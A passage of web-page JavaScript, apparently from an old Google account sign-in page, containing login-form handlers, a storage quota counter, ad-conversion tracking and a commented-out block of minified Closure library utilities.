  passwd_elem.onfocus = MaybePingUser;
}
function OnLoad() {
  MaybePingUser();
  LogRoundtripTime();
  if (!quota_elem) {
  quota_elem = el("quota");
  updateQuota();
  }
  LoadConversionScript();
}
function updateQuota() {
  if (!quota_elem) {
  return;
  }
  var now = (new Date()).getTime();
  var i;
  for (i = 0; i < CP.length; i++) {
    if (now < CP[i][0]) {
      break;
    }
  }
  if (i == 0) {
    setTimeout(updateQuota, 1000);
  } else if (i == CP.length) {
    quota_elem.innerHTML = CP[i - 1][1];
  } else {
    var ts = CP[i - 1][0];
    var bs = CP[i - 1][1];
    quota_elem.innerHTML = format(((now-ts) / (CP[i][0]-ts) * (CP[i][1]-bs)) + bs);
    setTimeout(updateQuota, 1000);
  }
}

var PAD = '.000000';

function format(num) {
  var str = String(num);
  var dot = str.indexOf('.');
  if (dot < 0) {
     return str + PAD;
  } if (PAD.length > (str.length - dot)) {
  return str + PAD.substring(str.length - dot);
  } else {
  return str.substring(0, dot + PAD.length);
  }
}
var google_conversion_type = 'landing';
var google_conversion_id = 1069902127;
var google_conversion_language = "en_US";
var google_conversion_format = "1";
var google_conversion_color = "FFFFFF";
function LoadConversionScript() {
  var script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "https://www.googleadservices.com/pagead/conversion.js";
}
// -->
</script>
<script>
gaia_attachEvent(window, 'load', function() {
  OnLoad();
  FixForm();
});
(function() {
  var gaiaLoginForm = document.getElementById('gaia_loginform');
  var gaia_onsubmitHandler = gaiaLoginForm.onsubmit;
  gaiaLoginForm.onsubmit = function() {
  lg();
  if (!fixed) {
  FixForm();
  }
  gaia_onsubmitHandler();
  };
})();
</script>
<!--

  <script>var PS_aa=PS_aa||{},PS_a=this,PS_b=function(a){return void 0!==a},PS_ba=function(){},PS_c=function(a){var b=typeof a;if("object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;var c=Object.prototype.toString.call(a);if("[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&
"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},PS_d=function(a){return"array"==PS_c(a)},PS_ca=function(a){var b=PS_c(a);return"array"==b||"object"==b&&"number"==typeof a.length},PS_e=function(a){return"string"==typeof a},PS_f=function(a){return"number"==typeof a},PS_da=function(a){var b=typeof a;return"object"==b&&null!=a||"function"==b},PS_ea="closure_uid_"+(1E9*
Math.random()>>>0),PS_fa=0,PS_ga=function(a,b,c){return a.call.apply(a.bind,arguments)},PS_ha=function(a,b,c){if(!a)throw Error();if(2<arguments.length){var d=Array.prototype.slice.call(arguments,2);return function(){var c=Array.prototype.slice.call(arguments);Array.prototype.unshift.apply(c,d);return a.apply(b,c)}}return function(){return a.apply(b,arguments)}},PS_g=function(a,b,c){PS_g=Function.prototype.bind&&-1!=Function.prototype.bind.toString().indexOf("native code")?PS_ga:PS_ha;return PS_g.apply(null,
arguments)},PS_ia=function(a,b){var c=Array.prototype.slice.call(arguments,1);return function(){var b=c.slice();b.push.apply(b,arguments);return a.apply(this,b)}},PS_h=Date.now||function(){return+new Date},PS_i=function(a,b){function c(){}c.prototype=b.prototype;a.P=b.prototype;a.prototype=new c;a.prototype.constructor=a;a.Fa=function(a,c,f){for(var g=Array(arguments.length-2),h=2;h<arguments.length;h++)g[h-2]=arguments[h];return b.prototype[c].apply(a,g)}};var PS_ja=function(a){if(Error.captureStackTrace)Error.captureStackTrace(this,PS_ja);else{var b=Error().stack;b&&(this.stack=b)}a&&(this.message=String(a))};PS_i(PS_ja,Error);PS_ja.prototype.name="CustomError";var PS_ka=function(a,b){for(var c=a.split("%s"),d="",e=Array.prototype.slice.call(arguments,1);e.length&&1<c.length;)d+=c.shift()+e.shift();return d+c.join("%s")},PS_la=String.prototype.trim?function(a){return a.trim()}:function(a){return a.replace(/^[\s\xa0]+|[\s\xa0]+$/g,"")},PS_ma=function(a){return decodeURIComponent(a.replace(/\+/g," "))},PS_ua=function(a){if(!PS_na.test(a))return a;-1!=a.indexOf("&")&&(a=a.replace(PS_oa,"&amp;"));-1!=a.indexOf("<")&&(a=a.replace(PS_pa,"&lt;"));-1!=a.indexOf(">")&&
(a=a.replace(PS_qa,"&gt;"));-1!=a.indexOf('"')&&(a=a.replace(PS_ra,"&quot;"));-1!=a.indexOf("'")&&(a=a.replace(PS_sa,"&#39;"));-1!=a.indexOf("\x00")&&(a=a.replace(PS_ta,"&#0;"));return a},PS_oa=/&/g,PS_pa=/</g,PS_qa=/>/g,PS_ra=/"/g,PS_sa=/'/g,PS_ta=/\x00/g,PS_na=/[\x00&<>"']/,PS_wa=function(a,b){for(var c=0,d=PS_la(String(a)).split("."),e=PS_la(String(b)).split("."),f=Math.max(d.length,e.length),g=0;0==c&&g<f;g++){var h=d[g]||"",k=e[g]||"",m=RegExp("(\\d*)(\\D*)","g"),l=RegExp("(\\d*)(\\D*)","g");
do{var n=m.exec(h)||["","",""],p=l.exec(k)||["","",""];if(0==n[0].length&&0==p[0].length)break;c=PS_va(0==n[1].length?0:parseInt(n[1],10),0==p[1].length?0:parseInt(p[1],10))||PS_va(0==n[2].length,0==p[2].length)||PS_va(n[2],p[2])}while(0==c)}return c},PS_va=function(a,b){return a<b?-1:a>b?1:0},PS_xa=function(a){return String(a).replace(/\-([a-z])/g,function(a,c){return c.toUpperCase()})},PS_ya=function(a){var b=PS_e(void 0)?"undefined".replace(/([-()\[\]{}+?*.$\^|,:#<!\\])/g,"\\$1").replace(/\x08/g,
"\\x08"):"\\s";return a.replace(new RegExp("(^"+(b?"|["+b+"]+":"")+")([a-z])","g"),function(a,b,e){return b+e.toUpperCase()})};var PS_za=function(a,b){b.unshift(a);PS_ja.call(this,PS_ka.apply(null,b));b.shift()};PS_i(PS_za,PS_ja);PS_za.prototype.name="AssertionError";
var PS_Aa=function(a,b,c,d){var e="Assertion failed";if(c)var e=e+(": "+c),f=d;else a&&(e+=": "+a,f=b);throw new PS_za(""+e,f||[]);},PS_j=function(a,b,c){a||PS_Aa("",null,b,Array.prototype.slice.call(arguments,2));return a},PS_k=function(a,b){throw new PS_za("Failure"+(a?": "+a:""),Array.prototype.slice.call(arguments,1));},PS_Ba=function(a,b,c){PS_f(a)||PS_Aa("Expected number but got %s: %s.",[PS_c(a),a],b,Array.prototype.slice.call(arguments,2));return a},PS_Ca=function(a,b,c){PS_e(a)||PS_Aa("Expected string but got %s: %s.",
[PS_c(a),a],b,Array.prototype.slice.call(arguments,2))},PS_Da=function(a,b,c){PS_da(a)&&1==a.nodeType||PS_Aa("Expected Element but got %s: %s.",[PS_c(a),a],b,Array.prototype.slice.call(arguments,2));return a},PS_Fa=function(a,b,c,d){a instanceof b||PS_Aa("Expected instanceof %s but got %s.",[PS_Ea(b),PS_Ea(a)],c,Array.prototype.slice.call(arguments,3))},PS_Ea=function(a){return a instanceof Function?a.displayName||a.name||"unknown type name":a instanceof Object?a.constructor.displayName||a.constructor.name||
Object.prototype.toString.call(a):null===a?"null":typeof a};var PS_Ga=Array.prototype.indexOf?function(a,b,c){PS_j(null!=a.length);return Array.prototype.indexOf.call(a,b,c)}:function(a,b,c){c=null==c?0:0>c?Math.max(0,a.length+c):c;if(PS_e(a))return PS_e(b)&&1==b.length?a.indexOf(b,c):-1;for(;c<a.length;c++)if(c in a&&a[c]===b)return c;return-1},PS_Ha=Array.prototype.forEach?function(a,b,c){PS_j(null!=a.length);Array.prototype.forEach.call(a,b,c)}:function(a,b,c){for(var d=a.length,e=PS_e(a)?a.split(""):a,f=0;f<d;f++)f in e&&b.call(c,e[f],f,a)},PS_Ia=Array.prototype.filter?
function(a,b,c){PS_j(null!=a.length);return Array.prototype.filter.call(a,b,c)}:function(a,b,c){for(var d=a.length,e=[],f=0,g=PS_e(a)?a.split(""):a,h=0;h<d;h++)if(h in g){var k=g[h];b.call(c,k,h,a)&&(e[f++]=k)}return e},PS_Ka=function(a){var b;a:{b=PS_Ja;for(var c=a.length,d=PS_e(a)?a.split(""):a,e=0;e<c;e++)if(e in d&&b.call(void 0,d[e],e,a)){b=e;break a}b=-1}return 0>b?null:PS_e(a)?a.charAt(b):a[b]},PS_La=function(a,b){var c=PS_Ga(a,b),d;if(d=0<=c)PS_j(null!=a.length),Array.prototype.splice.call(a,
c,1);return d},PS_Ma=function(a){return Array.prototype.concat.apply(Array.prototype,arguments)},PS_Na=function(a){var b=a.length;if(0<b){for(var c=Array(b),d=0;d<b;d++)c[d]=a[d];return c}return[]};var PS_l=function(){this.D=this.D;this.B=this.B};PS_l.prototype.D=!1;PS_l.prototype.ba=function(){this.D||(this.D=!0,this.c())};var PS_m=function(a,b){var c=PS_ia(PS_Oa,b);a.D?c.call(void 0):(a.B||(a.B=[]),a.B.push(PS_b(void 0)?PS_g(c,void 0):c))};PS_l.prototype.c=function(){if(this.B)for(;this.B.length;)this.B.shift()()};var PS_Oa=function(a){a&&"function"==typeof a.ba&&a.ba()};var PS_Pa=function(a){PS_Pa[" "](a);return a};PS_Pa[" "]=PS_ba;var PS_Qa=function(a,b,c){for(var d in a)b.call(c,a[d],d,a)},PS_Ra=function(a){var b=[],c=0,d;for(d in a)b[c++]=a[d];return b},PS_Sa=function(a){var b=[],c=0,d;for(d in a)b[c++]=d;return b},PS_Ta=function(a){return null!==a&&"withCredentials"in a},PS_Ua="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" "),PS_Va=function(a,b){for(var c,d,e=1;e<arguments.length;e++){d=arguments[e];for(c in d)a[c]=d[c];for(var f=0;f<PS_Ua.length;f++)c=PS_Ua[f],Object.prototype.hasOwnProperty.call(d,
c)&&(a[c]=d[c])}};var PS_n;a:{var PS_Wa=PS_a.navigator;if(PS_Wa){var PS_Xa=PS_Wa.userAgent;if(PS_Xa){PS_n=PS_Xa;break a}}PS_n=""}var PS_=function(a){return-1!=PS_n.indexOf(a)};var PS_Ya=function(){return(PS_("Chrome")||PS_("CriOS"))&&!PS_("Edge")};var PS_Za=function(){return PS_("iPhone")&&!PS_("iPod")&&!PS_("iPad")};var PS_o=PS_("Opera"),PS_p=PS_("Trident")||PS_("MSIE"),PS__a=PS_("Edge"),PS_q=PS_("Gecko")&&!(-1!=PS_n.toLowerCase().indexOf("webkit")&&!PS_("Edge"))&&!(PS_("Trident")||PS_("MSIE"))&&!PS_("Edge"),PS_r=-1!=PS_n.toLowerCase().indexOf("webkit")&&!PS_("Edge"),PS_0a=PS_("Macintosh"),PS_1a=function(){var a=PS_a.document;return a?a.documentMode:void 0},PS_2a;
a:{var PS_3a="",PS_4a=function(){var a=PS_n;if(PS_q)return/rv\:([^\);]+)(\)|;)/.exec(a);if(PS__a)return/Edge\/([\d\.]+)/.exec(a);if(PS_p)return/\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/.exec(a);if(PS_r)return/WebKit\/(\S+)/.exec(a);if(PS_o)return/(?:Version)[ \/]?(\S+)/.exec(a)}();PS_4a&&(PS_3a=PS_4a?PS_4a[1]:"");if(PS_p){var PS_5a=PS_1a();if(null!=PS_5a&&PS_5a>parseFloat(PS_3a)){PS_2a=String(PS_5a);break a}}PS_2a=PS_3a}
var PS_6a=PS_2a,PS_7a={},PS_s=function(a){return PS_7a[a]||(PS_7a[a]=0<=PS_wa(PS_6a,a))},PS_8a=PS_a.document,PS_t=PS_8a&&PS_p?PS_1a()||("CSS1Compat"==PS_8a.compatMode?parseInt(PS_6a,10):5):void 0;var PS_9a=!PS_p||9<=Number(PS_t),PS_$a=!PS_p||9<=Number(PS_t),PS_ab=PS_p&&!PS_s("9");!PS_r||PS_s("528");PS_q&&PS_s("1.9b")||PS_p&&PS_s("8")||PS_o&&PS_s("9.5")||PS_r&&PS_s("528");PS_q&&!PS_s("8")||PS_p&&PS_s("9");var PS_u=function(a,b){this.type=a;this.a=this.target=b;this.pa=!0};PS_u.prototype.preventDefault=function(){this.pa=!1};var PS_bb=function(a,b){PS_u.call(this,a?a.type:"");this.a=this.target=null;this.keyCode=this.clientY=this.clientX=0;this.na=!1;this.R=null;if(a){this.type=a.type;var c=a.changedTouches?a.changedTouches[0]:null;this.target=a.target||a.srcElement;this.a=b;var d=a.relatedTarget;if(d&&PS_q)try{PS_Pa(d.nodeName)}catch(e){}null===c?(this.clientX=void 0!==a.clientX?a.clientX:a.pageX,this.clientY=void 0!==a.clientY?a.clientY:a.pageY):(this.clientX=void 0!==c.clientX?c.clientX:c.pageX,this.clientY=void 0!==
c.clientY?c.clientY:c.pageY);this.keyCode=a.keyCode||0;this.na=a.ctrlKey;this.R=a;a.defaultPrevented&&this.preventDefault()}};PS_i(PS_bb,PS_u);var PS_cb=[1,4,2];PS_bb.prototype.preventDefault=function(){PS_bb.P.preventDefault.call(this);var a=this.R;if(a.preventDefault)a.preventDefault();else if(a.returnValue=!1,PS_ab)try{if(a.ctrlKey||112<=a.keyCode&&123>=a.keyCode)a.keyCode=-1}catch(b){}};var PS_db="closure_listenable_"+(1E6*Math.random()|0),PS_eb=function(a){return!(!a||!a[PS_db])},PS_fb=0;var PS_gb=function(a,b,c,d,e){this.listener=a;this.a=null;this.src=b;this.type=c;this.aa=!!d;this.ca=e;this.ea=++PS_fb;this.V=this.$=!1},PS_hb=function(a){a.V=!0;a.listener=null;a.a=null;a.src=null;a.ca=null};var PS_ib=function(a){this.src=a;this.a={};this.c=0},PS_kb=function(a,b,c,d,e,f){var g=b.toString();b=a.a[g];b||(b=a.a[g]=[],a.c++);var h=PS_jb(b,c,e,f);-1<h?(a=b[h],d||(a.$=!1)):(a=new PS_gb(c,a.src,g,!!e,f),a.$=d,b.push(a));return a},PS_lb=function(a,b){var c=b.type;c in a.a&&PS_La(a.a[c],b)&&(PS_hb(b),0==a.a[c].length&&(delete a.a[c],a.c--))},PS_mb=function(a,b,c,d,e){a=a.a[b.toString()];b=-1;a&&(b=PS_jb(a,c,d,e));return-1<b?a[b]:null},PS_jb=function(a,b,c,d){for(var e=0;e<a.length;++e){var f=
a[e];if(!f.V&&f.listener==b&&f.aa==!!c&&f.ca==d)return e}return-1};var PS_nb="closure_lm_"+(1E6*Math.random()|0),PS_ob={},PS_pb=0,PS_qb=function(a,b,c,d,e){if(PS_d(b)){for(var f=0;f<b.length;f++)PS_qb(a,b[f],c,d,e);return null}c=PS_rb(c);return PS_eb(a)?PS_sb(a,b,c,d,e):PS_tb(a,b,c,!1,d,e)},PS_tb=function(a,b,c,d,e,f){if(!b)throw Error("Invalid event type");var g=!!e,h=PS_ub(a);h||(a[PS_nb]=h=new PS_ib(a));c=PS_kb(h,b,c,d,e,f);if(c.a)return c;d=PS_vb();c.a=d;d.src=a;d.listener=c;if(a.addEventListener)a.addEventListener(b.toString(),d,g);else if(a.attachEvent)a.attachEvent(PS_wb(b.toString()),
d);else throw Error("addEventListener and attachEvent are unavailable.");PS_pb++;return c},PS_vb=function(){var a=PS_xb,b=PS_$a?function(c){return a.call(b.src,b.listener,c)}:function(c){c=a.call(b.src,b.listener,c);if(!c)return c};return b},PS_yb=function(a,b,c,d,e){if(PS_d(b)){for(var f=0;f<b.length;f++)PS_yb(a,b[f],c,d,e);return null}c=PS_rb(c);return PS_eb(a)?PS_kb(a.b,String(b),c,!0,d,e):PS_tb(a,b,c,!0,d,e)},PS_zb=function(a,b,c,d,e){if(PS_d(b))for(var f=0;f<b.length;f++)PS_zb(a,b[f],c,d,e);
else c=PS_rb(c),PS_eb(a)?(a=a.b,b=String(b).toString(),b in a.a&&(f=a.a[b],c=PS_jb(f,c,d,e),-1<c&&(PS_hb(f[c]),PS_j(null!=f.length),Array.prototype.splice.call(f,c,1),0==f.length&&(delete a.a[b],a.c--)))):a&&(a=PS_ub(a))&&(c=PS_mb(a,b,c,!!d,e))&&PS_v(c)},PS_v=function(a){if(!PS_f(a)&&a&&!a.V){var b=a.src;if(PS_eb(b))PS_lb(b.b,a);else{var c=a.type,d=a.a;b.removeEventListener?b.removeEventListener(c,d,a.aa):b.detachEvent&&b.detachEvent(PS_wb(c),d);PS_pb--;(c=PS_ub(b))?(PS_lb(c,a),0==c.c&&(c.src=null,
b[PS_nb]=null)):PS_hb(a)}}},PS_wb=function(a){return a in PS_ob?PS_ob[a]:PS_ob[a]="on"+a},PS_Bb=function(a,b,c,d){var e=!0;if(a=PS_ub(a))if(b=a.a[b.toString()])for(b=b.concat(),a=0;a<b.length;a++){var f=b[a];f&&f.aa==c&&!f.V&&(f=PS_Ab(f,d),e=e&&!1!==f)}return e},PS_Ab=function(a,b){var c=a.listener,d=a.ca||a.src;a.$&&PS_v(a);return c.call(d,b)},PS_xb=function(a,b){if(a.V)return!0;if(!PS_$a){var c;if(!(c=b))a:{c=["window","event"];for(var d=PS_a,e;e=c.shift();)if(null!=d[e])d=d[e];else{c=null;break a}c=
d}e=c;c=new PS_bb(e,this);d=!0;if(!(0>e.keyCode||void 0!=e.returnValue)){a:{var f=!1;if(0==e.keyCode)try{e.keyCode=-1;break a}catch(k){f=!0}if(f||void 0==e.returnValue)e.returnValue=!0}e=[];for(f=c.a;f;f=f.parentNode)e.push(f);for(var f=a.type,g=e.length-1;0<=g;g--){c.a=e[g];var h=PS_Bb(e[g],f,!0,c),d=d&&h}for(g=0;g<e.length;g++)c.a=e[g],h=PS_Bb(e[g],f,!1,c),d=d&&h}return d}return PS_Ab(a,new PS_bb(b,this))},PS_ub=function(a){a=a[PS_nb];return a instanceof PS_ib?a:null},PS_Cb="__closure_events_fn_"+
(1E9*Math.random()>>>0),PS_rb=function(a){PS_j(a,"Listener can not be null.");if("function"==PS_c(a))return a;PS_j(a.handleEvent,"An object listener must have handleEvent method.");a[PS_Cb]||(a[PS_Cb]=function(b){return a.handleEvent(b)});return a[PS_Cb]};var PS_Db=function(a){var b;b=b||0;return function(){return a.apply(this,Array.prototype.slice.call(arguments,0,b))}},PS_Eb=function(a){var b=!1,c;return function(){b||(c=a(),b=!0);return c}};var PS_w=function(a,b,c){PS_l.call(this);this.a=null;this.h=!1;this.f=a;this.i=c;this.b=b||window;this.g=PS_g(this.j,this)};PS_i(PS_w,PS_l);
var PS_Ib=function(a){PS_Fb(a);a.h=!1;var b=PS_Gb(a),c=PS_Hb(a);b&&!c&&a.b.mozRequestAnimationFrame?(a.a=PS_qb(a.b,"MozBeforePaint",a.g),a.b.mozRequestAnimationFrame(null),a.h=!0):a.a=b&&c?b.call(a.b,a.g):a.b.setTimeout(PS_Db(a.g),20)},PS_Fb=function(a){if(null!=a.a){var b=PS_Gb(a),c=PS_Hb(a);b&&!c&&a.b.mozRequestAnimationFrame?PS_v(a.a):b&&c?c.call(a.b,a.a):a.b.clearTimeout(a.a)}a.a=null};PS_w.prototype.j=function(){this.h&&this.a&&PS_v(this.a);this.a=null;this.f.call(this.i,PS_h())};
PS_w.prototype.c=function(){PS_Fb(this);PS_w.P.c.call(this)};var PS_Gb=function(a){a=a.b;return a.requestAnimationFrame||a.webkitRequestAnimationFrame||a.mozRequestAnimationFrame||a.oRequestAnimationFrame||a.msRequestAnimationFrame||null},PS_Hb=function(a){a=a.b;return a.cancelAnimationFrame||a.cancelRequestAnimationFrame||a.webkitCancelRequestAnimationFrame||a.mozCancelRequestAnimationFrame||a.oCancelRequestAnimationFrame||a.msCancelRequestAnimationFrame||null};var PS_x=function(){PS_l.call(this);this.b=new PS_ib(this);this.W=this;this.F=null};PS_i(PS_x,PS_l);PS_x.prototype[PS_db]=!0;PS_x.prototype.removeEventListener=function(a,b,c,d){PS_zb(this,a,b,c,d)};
var PS_y=function(a,b){PS_Jb(a);var c,d=a.F;if(d){c=[];for(var e=1;d;d=d.F)c.push(d),PS_j(1E3>++e,"infinite loop")}var d=a.W,e=b,f=e.type||e;if(PS_e(e))e=new PS_u(e,d);else if(e instanceof PS_u)e.target=e.target||d;else{var g=e,e=new PS_u(f,d);PS_Va(e,g)}var g=!0,h;if(c)for(var k=c.length-1;0<=k;k--)h=e.a=c[k],g=PS_Kb(h,f,!0,e)&&g;h=e.a=d;g=PS_Kb(h,f,!0,e)&&g;g=PS_Kb(h,f,!1,e)&&g;if(c)for(k=0;k<c.length;k++)h=e.a=c[k],g=PS_Kb(h,f,!1,e)&&g};
PS_x.prototype.c=function(){PS_x.P.c.call(this);if(this.b){var a=this.b,b=0,c;for(c in a.a){for(var d=a.a[c],e=0;e<d.length;e++)++b,PS_hb(d[e]);delete a.a[c];a.c--}}this.F=null};
var PS_sb=function(a,b,c,d,e){PS_Jb(a);return PS_kb(a.b,String(b),c,!1,d,e)},PS_Kb=function(a,b,c,d){b=a.b.a[String(b)];if(!b)return!0;b=b.concat();for(var e=!0,f=0;f<b.length;++f){var g=b[f];if(g&&!g.V&&g.aa==c){var h=g.listener,k=g.ca||g.src;g.$&&PS_lb(a.b,g);e=!1!==h.call(k,d)&&e}}return e&&0!=d.pa},PS_Jb=function(a){PS_j(a.b,"Event target is not initialized. Did you call the superclass (goog.events.EventTarget) constructor?")};var PS_z=function(a,b){PS_x.call(this);this.g=a||1;this.f=b||PS_a;this.i=PS_g(this.l,this);this.j=PS_h()};PS_i(PS_z,PS_x);PS_z.prototype.h=!1;PS_z.prototype.a=null;var PS_Nb=function(a,b){a.g=b;a.a&&a.h?(PS_Lb(a),PS_Mb(a)):a.a&&PS_Lb(a)};PS_z.prototype.l=function(){if(this.h){var a=PS_h()-this.j;0<a&&a<.8*this.g?this.a=this.f.setTimeout(this.i,this.g-a):(this.a&&(this.f.clearTimeout(this.a),this.a=null),PS_y(this,"tick"),this.h&&(this.a=this.f.setTimeout(this.i,this.g),this.j=PS_h()))}};
var PS_Mb=function(a){a.h=!0;a.a||(a.a=a.f.setTimeout(a.i,a.g),a.j=PS_h())},PS_Lb=function(a){a.h=!1;a.a&&(a.f.clearTimeout(a.a),a.a=null)};PS_z.prototype.c=function(){PS_z.P.c.call(this);PS_Lb(this);delete this.f};var PS_Ob=function(a,b,c){if("function"==PS_c(a))c&&(a=PS_g(a,c));else if(a&&"function"==typeof a.handleEvent)a=PS_g(a.handleEvent,a);else throw Error("Invalid listener argument");return 2147483647<Number(b)?-1:PS_a.setTimeout(a,b||0)};var PS_A=function(a,b,c){PS_l.call(this);this.f=a;this.h=b||0;this.b=c;this.g=PS_g(this.i,this)};PS_i(PS_A,PS_l);PS_A.prototype.a=0;PS_A.prototype.c=function(){PS_A.P.c.call(this);PS_Pb(this);delete this.f;delete this.b};var PS_Pb=function(a){0!=a.a&&PS_a.clearTimeout(a.a);a.a=0};PS_A.prototype.i=function(){this.a=0;this.f&&this.f.call(this.b)};var PS_Qb=function(a){if(a.classList)return a.classList;a=a.className;return PS_e(a)&&a.match(/\S+/g)||[]},PS_Rb=function(a,b){var c;a.classList?c=a.classList.contains(b):(c=PS_Qb(a),c=0<=PS_Ga(c,b));return c},PS_Sb=function(a,b){a.classList?a.classList.add(b):PS_Rb(a,b)||(a.className+=0<a.className.length?" "+b:b)},PS_Tb=function(a,b){a.classList?a.classList.remove(b):PS_Rb(a,b)&&(a.className=PS_Ia(PS_Qb(a),function(a){return a!=b}).join(" "))},PS_B=function(a,b,c){c?PS_Sb(a,b):PS_Tb(a,b)};var PS_Ub=PS_("Firefox"),PS_Vb=PS_Za()||PS_("iPod"),PS_Wb=PS_("iPad"),PS_Xb=PS_("Android")&&!(PS_Ya()||PS_("Firefox")||PS_("Opera")||PS_("Silk")),PS_Yb=PS_Ya(),PS_Zb=PS_("Safari")&&!(PS_Ya()||PS_("Coast")||PS_("Opera")||PS_("Edge")||PS_("Silk")||PS_("Android"))&&!(PS_Za()||PS_("iPad")||PS_("iPod"));var PS__b=!PS_p,PS_0b=function(a){return PS__b&&a.dataset?"altText"in a.dataset?a.dataset.altText:null:a.getAttribute("data-"+"altText".replace(/([A-Z])/g,"-$1").toLowerCase())};var PS_1b={area:!0,base:!0,br:!0,col:!0,command:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0};var PS_C=function(){this.a="";this.c=PS_2b};PS_C.prototype.S=!0;PS_C.prototype.O=function(){return this.a};PS_C.prototype.toString=function(){return"Const{"+this.a+"}"};var PS_3b=function(a){if(a instanceof PS_C&&a.constructor===PS_C&&a.c===PS_2b)return a.a;PS_k("expected object of type Const, got '"+a+"'");return"type_error:Const"},PS_2b={},PS_4b=function(a){var b=new PS_C;b.a=a;return b};var PS_D=function(){this.a="";this.c=PS_5b};PS_D.prototype.S=!0;var PS_5b={};PS_D.prototype.O=function(){return this.a};PS_D.prototype.toString=function(){return"SafeStyle{"+this.a+"}"};PS_D.prototype.da=function(a){this.a=a;return this};var PS_6b=(new PS_D).da(""),PS_7b=/^([-,."'%_!# a-zA-Z0-9]+|(?:rgb|hsl)a?\([0-9.%, ]+\))$/;var PS_E=function(){this.K="";this.a=PS_8b};PS_E.prototype.S=!0;PS_E.prototype.O=function(){return this.K};PS_E.prototype.fa=!0;PS_E.prototype.X=function(){return 1};PS_E.prototype.toString=function(){return"SafeUrl{"+this.K+"}"};
var PS_9b=function(a){if(a instanceof PS_E&&a.constructor===PS_E&&a.a===PS_8b)return a.K;PS_k("expected object of type SafeUrl, got '"+a+"' of type "+PS_c(a));return"type_error:SafeUrl"},PS_$b=/^(?:(?:https?|mailto|ftp):|[^&:/?#]*(?:[/?#]|$))/i,PS_bc=function(a){if(a instanceof PS_E)return a;a=a.S?a.O():String(a);PS_$b.test(a)||(a="about:invalid#zClosurez");return PS_ac(a)},PS_8b={},PS_ac=function(a){var b=new PS_E;b.K=a;return b};PS_ac("about:blank");var PS_F=function(){this.a="";this.c=PS_cc};PS_F.prototype.S=!0;PS_F.prototype.O=function(){return this.a};PS_F.prototype.fa=!0;PS_F.prototype.X=function(){return 1};PS_F.prototype.toString=function(){return"TrustedResourceUrl{"+this.a+"}"};var PS_dc=function(a){if(a instanceof PS_F&&a.constructor===PS_F&&a.c===PS_cc)return a.a;PS_k("expected object of type TrustedResourceUrl, got '"+a+"' of type "+PS_c(a));return"type_error:TrustedResourceUrl"},PS_cc={},PS_ec=function(a){var b=new PS_F;b.a=a;return b};var PS_G=function(){this.K="";this.sa=PS_fc;this.la=null};PS_G.prototype.fa=!0;PS_G.prototype.X=function(){return this.la};PS_G.prototype.S=!0;PS_G.prototype.O=function(){return this.K};PS_G.prototype.toString=function(){return"SafeHtml{"+this.K+"}"};
var PS_H=function(a){if(a instanceof PS_G&&a.constructor===PS_G&&a.sa===PS_fc)return a.K;PS_k("expected object of type SafeHtml, got '"+a+"' of type "+PS_c(a));return"type_error:SafeHtml"},PS_gc=/^[a-zA-Z0-9-]+$/,PS_hc={action:!0,cite:!0,data:!0,formaction:!0,href:!0,manifest:!0,poster:!0,src:!0},PS_ic={APPLET:!0,BASE:!0,EMBED:!0,IFRAME:!0,LINK:!0,MATH:!0,META:!0,OBJECT:!0,SCRIPT:!0,STYLE:!0,SVG:!0,TEMPLATE:!0},PS_kc=function(a,b,c){if(!PS_gc.test(a))throw Error("Invalid tag name <"+a+">.");if(a.toUpperCase()in
PS_ic)throw Error("Tag name <"+a+"> is not allowed for SafeHtml.");return PS_jc(a,b,c)},PS_lc=function(a){var b=0,c="",d=function(a){if(PS_d(a))PS_Ha(a,d);else{if(!(a instanceof PS_G)){var f=null;a.fa&&(f=a.X());a=PS_I(PS_ua(a.S?a.O():String(a)),f)}c+=PS_H(a);a=a.X();0==b?b=a:0!=a&&b!=a&&(b=null)}};PS_Ha(arguments,d);return PS_I(c,b)},PS_fc={},PS_I=function(a,b){return(new PS_G).da(a,b)};PS_G.prototype.da=function(a,b){this.K=a;this.la=b;return this};
var PS_jc=function(a,b,c){var d=null,e,f="";if(b)for(e in b){if(!PS_gc.test(e))throw Error('Invalid attribute name "'+e+'".');var g=b[e];if(null!=g){var h,k=a;h=e;if(g instanceof PS_C)g=PS_3b(g);else if("style"==h.toLowerCase()){if(!PS_da(g))throw Error('The "style" attribute requires goog.html.SafeStyle or map of style properties, '+typeof g+" given: "+g);if(!(g instanceof PS_D)){var k="",m=void 0;for(m in g){if(!/^[-_a-zA-Z0-9]+$/.test(m))throw Error("Name allows only [-_a-zA-Z0-9], got: "+m);var l=
g[m];if(null!=l){if(l instanceof PS_C)l=PS_3b(l),PS_j(!/[{;}]/.test(l),"Value does not allow [{;}].");else if(PS_7b.test(l)){for(var n=!0,p=!0,q=0;q<l.length;q++){var r=l.charAt(q);"'"==r&&p?n=!n:'"'==r&&n&&(p=!p)}n&&p||(PS_k("String value requires balanced quotes, got: "+l),l="zClosurez")}else PS_k("String value allows only [-,.\"'%_!# a-zA-Z0-9], rgb() and rgba(), got: "+l),l="zClosurez";k+=m+":"+l+";"}}k?(PS_j(!/[<>]/.test(k),"Forbidden characters in style string: "+k),g=(new PS_D).da(k)):g=PS_6b}k=
void 0;g instanceof PS_D&&g.constructor===PS_D&&g.c===PS_5b?k=g.a:(PS_k("expected object of type SafeStyle, got '"+g+"' of type "+PS_c(g)),k="type_error:SafeStyle");g=k}else{if(/^on/i.test(h))throw Error('Attribute "'+h+'" requires goog.string.Const value, "'+g+'" given.');if(h.toLowerCase()in PS_hc)if(g instanceof PS_F)g=PS_dc(g);else if(g instanceof PS_E)g=PS_9b(g);else if(PS_e(g))g=PS_bc(g).O();else throw Error('Attribute "'+h+'" on tag "'+k+'" requires goog.html.SafeUrl, goog.string.Const, or string, value "'+
